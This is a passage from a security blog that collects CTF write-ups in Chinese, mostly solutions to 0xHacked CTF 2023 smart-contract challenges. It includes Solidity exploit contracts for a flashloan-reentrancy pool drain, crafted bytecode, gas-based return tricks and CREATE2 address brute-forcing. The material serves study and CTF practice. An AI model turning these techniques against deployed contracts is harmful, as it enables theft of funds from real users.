href="https://www.levi104.com/2023/07/03/00.security/42.CREATE%20and%20CREATE2%20redelpoy/">00.security-42: CREATE, CREATE2, selfDestruct, bytecode</a></li><li><a href="https://www.levi104.com/2023/06/29/02.ChainflagCTF/16.reentrancy%20@babybank/">02.chainflag-16: CREATE2, Reentrant, underflow, compulsory transfer of funds</a></li><li><a href="https://www.levi104.com/2023/07/04/02.ChainflagCTF/17.reentrancy%20@h4ck/">02.chainflag-17: logic, Reentrant, underflow, compulsory transfer of funds</a></li><li><a href="https://www.levi104.com/2023/07/04/07.ACTF%202022%20Blockchain/01.ACTF%20@bet2loss/">07.ACTF 2022 Blockchain - 01: Pseudo random number, selfdestruct, CREATE2</a></li><li><a href="https://www.levi104.com/2023/07/17/04.Ethernaut%20CTF/24.Puzzle%20Wallet/">04.ethernaut-24: proxy, storage, logic, msg.value+loop</a></li><li><a href="https://www.levi104.com/2023/07/19/04.Ethernaut%20CTF/26.DoublicEntryPoint/">04.ethernaut-26: delegatecall, logic, defendRobot, calldata</a></li><li><a href="https://www.levi104.com/2023/07/19/04.Ethernaut%20CTF/28.Gatekeeper%20Three/">04.ethernaut-28: contains a lot of simple knowledge</a></li><li><a href="https://www.levi104.com/2023/07/23/14.Paradigm%20CTF%202022/03.hint-finance/">14.Paradigm CTF 2022-03: ERC20, ERC777, reentrancy, Selector collision, logic</a></li><li><a href="https://www.levi104.com/2023/07/25/14.Paradigm%20CTF%202022/05.vanity/">14.Paradigm CTF 2022-05: precompile contract, Brute force, signature verify</a></li><li><a href="https://www.levi104.com/2023/07/26/14.Paradigm%20CTF%202022/07.Lockbox2/">14.Paradigm CTF 2022-07: gas, inline assembly, zero slot, logic, account, calldata</a></li><li><a href="https://www.levi104.com/2023/07/27/16.CBSC%20CTF%202022/03.challenge/">16.CBSC 2022-03: CREATE2, merkle tree</a></li><li><a href="https://www.levi104.com/2023/07/28/16.CBSC%20CTF%202022/04.challenge/">16.CBSC 2022-04: CREATE2, reentrancy, selfdestruct, whitelist, airdrop</a></li><li><a href="https://www.levi104.com/2023/06/23/00.security/37.FlashLoanMain/">16.CBSC 2022-04: flashloan, signature, account</a></li><li><a href="https://www.levi104.com/2023/07/29/16.CBSC%20CTF%202022/11.challenge_pro/">16.CBSC 2022-11: bytecode, storage, account</a></li></ul></li><li><strong>DeFi</strong><ul><li><strong>Logic</strong><ul><li><a href="https://www.levi104.com/2023/06/23/00.security/38.LostAssets/">00.security-38</a></li><li><a href="https://www.levi104.com/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/04.Side%20Entrance/">05.Damn Vulnerable DeFi v2-04</a></li><li><a href="https://www.levi104.com/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/10.FreeRider/">05.Damn Vulnerable DeFi v2-10</a></li></ul></li><li><strong>swap</strong><ul><li><a href="https://www.levi104.com/2023/07/17/04.Ethernaut%20CTF/23.Dex2/">04.Ethernaut-23</a></li><li><a href="https://www.levi104.com/2023/07/22/14.Paradigm%20CTF%202022/02.rescue/">14.Paradigm CTF 2022-02</a></li><li><a href="https://www.levi104.com/2023/07/27/16.CBSC%20CTF%202022/01.challenge/">16.CBSC 2022-01</a></li></ul></li><li><strong>proposal</strong><ul><li><a href="https://www.levi104.com/2023/07/20/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/12.Climber/">05.Damn Vulnerable DeFi v2-12</a></li></ul></li><li><strong>Price</strong><ul><li><a href="https://www.levi104.com/2023/06/23/04.Ethernaut%20CTF/22.Dex/">04.Ethernaut CTF-22</a></li><li><a href="https://www.levi104.com/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/08.Puppet/">05.Damn Vulnerable DeFi v2-08</a></li><li><a href="https://www.levi104.com/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/09.Puppet%20V2/">05.Damn Vulnerable DeFi v2-09</a></li></ul></li><li><strong>Flashloan</strong><ul><li><a href="https://www.levi104.com/2023/06/23/00.security/37.FlashLoanMain/">00.security-37</a></li><li><a href="https://www.levi104.com/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/02.Naive%20receiver/">05.Damn Vulnerable DeFi v2-02</a></li><li><a href="https://www.levi104.com/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/03.Truster/">05.Damn Vulnerable DeFi v2-03</a></li></ul></li><li><strong>DoS</strong><ul><li><a href="https://www.levi104.com/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/01.unstoppable/">05.Damn Vulnerable DeFi v2-01</a></li></ul></li><li><strong>wallet</strong><ul><li><a href="https://www.levi104.com/2023/07/20/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/11.backdoor/">05.Damn Vulnerable DeFi v2-11</a></li></ul></li><li><strong>stake</strong><ul><li><a href="https://www.levi104.com/2023/07/29/16.CBSC%20CTF%202022/10.challenge_pro/">16.CBSC 2022-10</a></li></ul></li><li><strong>Combination</strong><ul><li><a href="https://www.levi104.com/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/05.The%20Rewarder/">05.Damn Vulnerable DeFi v2-05: Logic, Falshloan</a></li><li><a href="https://www.levi104.com/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/06.Selfie/">05.Damn Vulnerable DeFi v2-06: Logic, Controllable info, Flashloan</a></li><li><a href="https://www.levi104.com/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/07.Compromised/">05.Damn Vulnerable DeFi v2-07: Account, Crypot</a></li><li><a href="https://www.levi104.com/2023/07/15/08.PoC/03.DFX%20Finance%20@Reentrancy@flashloan/">08.PoC-03: Reentrancy, flashloan</a></li></ul></li></ul></li><li><strong>Others</strong><ul><li><a href="https://www.levi104.com/2023/06/23/04.Ethernaut%20CTF/17.Recovery/">04.Ethernaut CTF-17</a></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 99.coordinate </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>00.digest</title>
      <link href="/2023/10/06/23.0xHackedCTF/00.digest/"/>
      <url>/2023/10/06/23.0xHackedCTF/00.digest/</url>
      
        <content type="html"><![CDATA[<h1 id="digest"><a href="#digest" class="headerlink" title="digest"></a>digest</h1><ul><li>时间：Sept 30 - Oct 2, 2023, UTC +0</li><li>题目代码仓库：<a href="https://github.com/0xHackedLabs/ctf/tree/main">https://github.com/0xHackedLabs/ctf/tree/main</a></li><li>比赛地址：<a href="https://ctf.0xhacked.com/challenges">https://ctf.0xhacked.com/challenges</a></li></ul><p>一共8题，个人做了2题，和团队CSL一共完成7题，最终结果第四名。</p><p><img src="/2023/10/06/23.0xHackedCTF/00.digest/image-20231006151826499.png" alt="image-20231006151826499"></p>]]></content>
      
      
      <categories>
          
          <category> 23.0xHackedCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>07.Snakes</title>
      <link href="/2023/10/06/23.0xHackedCTF/07.Snakes/"/>
      <url>/2023/10/06/23.0xHackedCTF/07.Snakes/</url>
      
        <content type="html"><![CDATA[<h1 id="Snakes"><a href="#Snakes" class="headerlink" title="Snakes"></a>Snakes</h1><p>这道题给了一大串字节码（其实是initcode），然后部署，调用输入的code参数，需要返回true。</p><p>经过反编译分析，返现参数code只有高8字节有用，多余内容会截断。分析题意只要程序执行到STOP操作码就可以了，这道题随便输入都很容易可以到STOP操作码，并且有很多STOP操作码的地方，个人感觉题目出得不好，随便试了几个参数code都可以通过。</p><p>题外话：即使本题找到STOP的条件很苛刻，也可以直接爆破，毕竟8字节的也不多，2**64种可能性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">interface ISnakes &#123;</span><br><span class="line">  function solve(bytes memory) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Exploit &#123;</span><br><span class="line"></span><br><span class="line">    // construct() &#123;&#125; // construct not allowed</span><br><span class="line"></span><br><span class="line">    function exploit() public &#123;</span><br><span class="line">        // write code here</span><br><span class="line">        address target = 0x827bB86B1594C77C9Ef9c126Bf1b0D46DC81aEEA;</span><br><span class="line">        bytes memory code = hex&quot;12345678&quot;;</span><br><span class="line">        ISnakes(target).solve(code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 23.0xHackedCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>04.Bytedance</title>
      <link href="/2023/10/06/23.0xHackedCTF/04.Bytedance/"/>
      <url>/2023/10/06/23.0xHackedCTF/04.Bytedance/</url>
      
        <content type="html"><![CDATA[<h1 id="Bytedance"><a href="#Bytedance" class="headerlink" title="Bytedance"></a>Bytedance</h1><p>完成题目需要跑通过两次staticcall返回不同的值。</p><p>第一次会把”Hello Player”和target的字节码打包创建一个新的合约。”Hello Player“的bytes表示为 0x48656c6c6f20506c61796572 转换为字节码为：</p><div class="table-container"><table><thead><tr><th>[00]</th><th>BASEFEE</th><th></th></tr></thead><tbody><tr><td>[01]</td><td>PUSH6</td><td>6c6c6f20506c</td></tr><tr><td>[08]</td><td>PUSH2</td><td>7965</td></tr><tr><td>[0b]</td><td>PUSH19</td></tr></tbody></table></div><p>可以看到前面这些字节码无伤大雅 只需要填充19字节就可以直接按照我们的逻辑来编写。</p><p>第二次把”<code>*V&quot;和target的字节码打包创建一个新合约。&quot;</code>*V”的bytes表示为0x602a56 转换为字节码为：</p><div class="table-container"><table><thead><tr><th>[00]</th><th>PUSH1</th><th>2a</th></tr></thead><tbody><tr><td>[02]</td><td>JUMP</td></tr></tbody></table></div><p>发现字节码会直接跳转到2a的地方继续执行，那么字节码中必须由jumpdest ，但是第一个打包中没有jump。</p><p>我首先考虑控制push19 和 jumpdest中间的字段，让第一次打包后jumpdest被覆盖进push的内容中，而第二次打包jumpdest在正确的位置，之后按照自身字节码长度来判断应该返回的值。</p><p>我构造了如下字节码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x72ffffffffffffffffffffffffffffffffffff7371ffffffffffffffffffffffffffffffffffff5b303b608052608051608d116062577f48656c6c6f20506c61796572ffffffffffffffffffffffffffffffffffffffff608052600c6080fd5b7f602a56ffffffffffffffffffffffffffffffffffffffffffffffffffffffffff60805260036080fd</span><br></pre></td></tr></table></figure><p>第一次打包后为：</p><p><img src="/2023/10/06/23.0xHackedCTF/04.Bytedance/image-20231006151431537.png" alt="image-20231006151431537"></p><p>第二次打包后为：</p><p><img src="/2023/10/06/23.0xHackedCTF/04.Bytedance/image-20231006151457377.png" alt="image-20231006151457377"></p><p>最后还要解决的一个问题是要求setup target时地址代码长度要求0，我们可以在构造函数中调用setup，这样由于合约还未完成部署，检测的代码长度为0。</p><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">interface IBytedance &#123;</span><br><span class="line">    function solve() external;</span><br><span class="line"></span><br><span class="line">    function setup() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Exploit &#123;</span><br><span class="line">    function exploit() public &#123;</span><br><span class="line">        address target = 0x2eB0fCb87fe17e7a2aB93B6d51C0A72D9dbA6bdC;</span><br><span class="line">        bytes</span><br><span class="line">            memory code = hex&quot;72ffffffffffffffffffffffffffffffffffff7371ffffffffffffffffffffffffffffffffffff5b303b608052608051608d116062577f48656c6c6f20506c61796572ffffffffffffffffffffffffffffffffffffffff608052600c6080fd5b7f602a56ffffffffffffffffffffffffffffffffffffffffffffffffffffffffff60805260036080fd&quot;;</span><br><span class="line">        Helper helper = new Helper(code);</span><br><span class="line"></span><br><span class="line">        IBytedance(target).solve();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Helper &#123;</span><br><span class="line">    constructor(bytes memory a) public payable &#123;</span><br><span class="line">        address target = 0x2eB0fCb87fe17e7a2aB93B6d51C0A72D9dbA6bdC;</span><br><span class="line">        IBytedance(target).setup();</span><br><span class="line">        assembly &#123;</span><br><span class="line">            return(add(0x20, a), mload(a))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>赛后想了下应该有更简单的构造方法，比如在jumpdest之前返回0x48656c6c6f20506c61796572，jumpdest之后返回0x602a56，并且用RETURN返回数据更好，当然本处使用了REVERT一样可行。</p>]]></content>
      
      
      <categories>
          
          <category> 23.0xHackedCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>05.Fatorial</title>
      <link href="/2023/10/06/23.0xHackedCTF/05.Factorial/"/>
      <url>/2023/10/06/23.0xHackedCTF/05.Factorial/</url>
      
        <content type="html"><![CDATA[<h1 id="Fatorial"><a href="#Fatorial" class="headerlink" title="Fatorial"></a>Fatorial</h1><p>题目让我们成功调用run方法，其中会staticcall回调msg.sender的<code>factorial(uint256)</code>5次，返回值累乘的结果是120。正常情况下，相同的返回值，累乘5次不可能刚好是120，因此我们需要返回不同的值。</p><p>因为staticcall限制不能修改状态，因此采用gas限制，根据冷热地址访问gas消耗不同，返回不同的值：第一次热访问返回120，后面4次冷访问都返回1，即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">interface IFactorial &#123;</span><br><span class="line">    function solve() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Exploit &#123;</span><br><span class="line">    IFactorial level;</span><br><span class="line"></span><br><span class="line">    // construct() &#123;&#125; // construct not allowed</span><br><span class="line"></span><br><span class="line">    function exploit() public &#123;</span><br><span class="line">        // write code here</span><br><span class="line">        address target = 0x1963ead4de36524e8EB53B88ccf79ff15Fe20baB;</span><br><span class="line">        level = IFactorial(target);</span><br><span class="line">        level.solve();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function factorial(uint256) public view returns (bytes32) &#123;</span><br><span class="line">        uint startGas = gasleft();</span><br><span class="line">        uint bal = address(0x100).balance;</span><br><span class="line">        uint usedGas = startGas - gasleft();</span><br><span class="line">        if (usedGas &lt; 1000) &#123;</span><br><span class="line">            bytes32 data01 = bytes32(uint256(1));</span><br><span class="line">            return data01;</span><br><span class="line">        &#125;</span><br><span class="line">        bytes32 data02 = bytes32(uint256(120));</span><br><span class="line">        return data02;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 23.0xHackedCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>03.StakePool</title>
      <link href="/2023/10/06/23.0xHackedCTF/03.StakePool/"/>
      <url>/2023/10/06/23.0xHackedCTF/03.StakePool/</url>
      
        <content type="html"><![CDATA[<h1 id="StakePool"><a href="#StakePool" class="headerlink" title="StakePool"></a>StakePool</h1><p>本题的Pool中flashloan存在重入，在flashloan过程中可以再次调用合约的deposit，这个deposit的行为就相当于还钱闪电贷了，但是却给我们记录了存款的假象。这样我们只需要支付闪贷的手续费，就可以获得大量余额。分多次削减Pool中余额完成题目，因为一次借贷太多钱会导致手续费过高，题目环境我们没有太多的钱。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line">interface IStakePool &#123;</span><br><span class="line">    function deposit() external payable returns (uint256);</span><br><span class="line">    function withdraw(uint256 shares) external returns (uint256);</span><br><span class="line">    function flashloan(uint256 amount, bytes calldata data) external;</span><br><span class="line">    function faucet() external;</span><br><span class="line">    function solve() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Exploit &#123;</span><br><span class="line">    uint shares;</span><br><span class="line"></span><br><span class="line">    function exploit() public &#123;</span><br><span class="line">        // write code here</span><br><span class="line">        address target = 0x511978e46Fc117795431f7493fB5288592097C4A;</span><br><span class="line"></span><br><span class="line">        IStakePool(target).faucet();</span><br><span class="line"></span><br><span class="line">        uint amount = (address(this).balance * 10000) / 5;</span><br><span class="line">        IStakePool(target).flashloan(amount, &quot;&quot;);</span><br><span class="line">        IStakePool(target).withdraw(shares);</span><br><span class="line">        for(uint i = 0; i &lt; 2; i++)&#123;</span><br><span class="line">            IStakePool(target).flashloan(address(target).balance, &quot;&quot;);</span><br><span class="line">            IStakePool(target).withdraw(shares);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        IStakePool(target).solve();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onStakPoolFlashloan(</span><br><span class="line">        uint amount,</span><br><span class="line">        uint feeAmount,</span><br><span class="line">        bytes memory data</span><br><span class="line">    ) external payable &#123;</span><br><span class="line">        address target = 0x511978e46Fc117795431f7493fB5288592097C4A;</span><br><span class="line">        shares = IStakePool(target).deposit&#123;value: amount + feeAmount&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 23.0xHackedCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>02.ChildOtter</title>
      <link href="/2023/10/06/23.0xHackedCTF/02.ChildOtter/"/>
      <url>/2023/10/06/23.0xHackedCTF/02.ChildOtter/</url>
      
        <content type="html"><![CDATA[<h1 id="ChildOtter"><a href="#ChildOtter" class="headerlink" title="ChildOtter"></a>ChildOtter</h1><p>做题时只是用debug查了下memory中0x20的值是0xad3228b676f7d3cd4284a5443f17f1962b36e491b30a40b2405849e597ba5fb5，因为<code>target=mload(32)</code>，直接取内存中0x20~0x40的值。</p><p>赛后仔细观察val[0] [0] = x;的赋值过程发现，会先计算第一层映射值的插槽储存在memory0x20中，用于计算第二层映射值的插槽，然后sstore，第二层的映射位置没有写入memory而是存在于stack用了就丢弃。</p><p><img src="/2023/10/06/23.0xHackedCTF/02.ChildOtter/image-20231006151225409.png" alt="image-20231006151225409"></p><p>原理：对应文档中的映射值得插槽计算方法通过<code>keccak256(abi.encodePacked(uint(key),uint(slot)))</code>可以算出 第一层映射值得插槽为：0xad3228b676f7d3cd4284a5443f17f1962b36e491b30a40b2405849e597ba5fb5，第二层映射插槽为：0xed428e1c45e1d9561b62834e1a2d3015a0caae3bfdc16b4da059ac885b01a145</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line">interface IChildOtter &#123;</span><br><span class="line">    function solve(uint x) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Exploit &#123;</span><br><span class="line">    function exploit() public &#123;</span><br><span class="line">        // write code here</span><br><span class="line">        address target = 0x63461D5b5b83bD9BA102fF21d8533b3aad172116;</span><br><span class="line">        IChildOtter(target).solve(</span><br><span class="line">            0xad3228b676f7d3cd4284a5443f17f1962b36e491b30a40b2405849e597ba5fb5</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 23.0xHackedCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>01.BabyOtter</title>
      <link href="/2023/10/06/23.0xHackedCTF/01.BabyOtter/"/>
      <url>/2023/10/06/23.0xHackedCTF/01.BabyOtter/</url>
      
        <content type="html"><![CDATA[<h1 id="BabyOtter"><a href="#BabyOtter" class="headerlink" title="BabyOtter"></a>BabyOtter</h1><p>这是应该说是一个算法题，很明显需要溢出，因为精度问题，uint256(-1)/0x1337并不行。没有写出一个脚本找出X，而是找到了其中的数学规律。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//387 第12次溢出</span></span><br><span class="line"><span class="comment">//362 第24次溢出</span></span><br><span class="line"><span class="comment">//337 第36次溢出</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">//12 第192溢出</span></span><br></pre></td></tr></table></figure><p>以上是一个循环，之后每个循环的末尾的数减1。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">interface IBabyOtter &#123;</span><br><span class="line">    function solve(uint x) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Exploit &#123;</span><br><span class="line">    function exploit() public &#123;</span><br><span class="line">        uint number = 106517423012574869748253447278778772725360170890836257832597187972312850502279;</span><br><span class="line">        address target = 0x4e309C767Acc9f9366d75C186454ed205d5Eeee3;</span><br><span class="line">        IBabyOtter(target).solve(number);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 23.0xHackedCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>04.who</title>
      <link href="/2023/09/30/22.MetaTrustCTF2023/04.who/"/>
      <url>/2023/09/30/22.MetaTrustCTF2023/04.who/</url>
      
        <content type="html"><![CDATA[<h1 id="who"><a href="#who" class="headerlink" title="who"></a>who</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-全局观"><a href="#1-全局观" class="headerlink" title="1.全局观"></a>1.全局观</h3><p>只有一个合约，一眼可以看出是过关斩将的题目类型：4个stage</p><h3 id="2-任务"><a href="#2-任务" class="headerlink" title="2.任务"></a>2.任务</h3><p>让mapping中的相关信息返回true</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function isSolved() external view returns (bool) &#123;</span><br><span class="line">    return stats[4][who];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3.详细分析"></a>3.详细分析</h3><h4 id="setup"><a href="#setup" class="headerlink" title="setup"></a>setup</h4><p>很明显，是要用CREATE2创建特殊要求的地址，那么就需要用CREATE2爆破了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function setup() external &#123;</span><br><span class="line">    require(uint256(uint160(msg.sender)) % 1000 == 137, &quot;!good caller&quot;);</span><br><span class="line">    who = msg.sender;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用下面的代码来爆破(FooEXP尚未写)：通过deploy部署得到符合<code>setup()</code>条件的攻击地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">function deploy() public returns(address)&#123;</span><br><span class="line">       address addr;</span><br><span class="line">       bytes memory bytecode = type(FooEXP).creationCode;</span><br><span class="line">       uint256 salt = bruteForceDeploy();</span><br><span class="line">       assembly &#123;</span><br><span class="line">           addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)</span><br><span class="line">       &#125;</span><br><span class="line">       deployedAddress = addr;</span><br><span class="line">       return addr;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   function getAddress( bytes memory bytecode, uint _salt) public view returns (address) &#123;</span><br><span class="line">       bytes32 hash = keccak256(</span><br><span class="line">           abi.encodePacked(</span><br><span class="line">               bytes1(0xff),</span><br><span class="line">               address(this),</span><br><span class="line">               _salt,</span><br><span class="line">               keccak256(bytecode)</span><br><span class="line">           )</span><br><span class="line">       );</span><br><span class="line"></span><br><span class="line">       // NOTE: cast last 20 bytes of hash to address</span><br><span class="line">       return address(uint160(uint(hash)));</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   function bruteForceDeploy() public view returns(uint)&#123;</span><br><span class="line">       for (uint i = 1; i &lt; 999999; i++) &#123;</span><br><span class="line">           address addr = getAddress(type(FooEXP).creationCode, i);</span><br><span class="line">           if (uint256(uint160(addr)) % 1000 == 137) &#123;</span><br><span class="line">               return i;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h4 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h4><p>攻击合约写一个<code>check()</code>方法，两次调用的返回结果不一样：第一次返回<code>keccak256(abi.encodePacked(&quot;1337&quot;))</code>，第二次返回<code>keccak256(abi.encodePacked(&quot;13337&quot;))</code>，和Ethernaut的<a href="https://www.levi104.com/2023/06/23/04.Ethernaut%20CTF/11.Elevator/">Elevator</a>原理一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function stage1() external &#123;</span><br><span class="line">    require(msg.sender == who, &quot;stage1: !setup&quot;);</span><br><span class="line">    stats[1][msg.sender] = true;</span><br><span 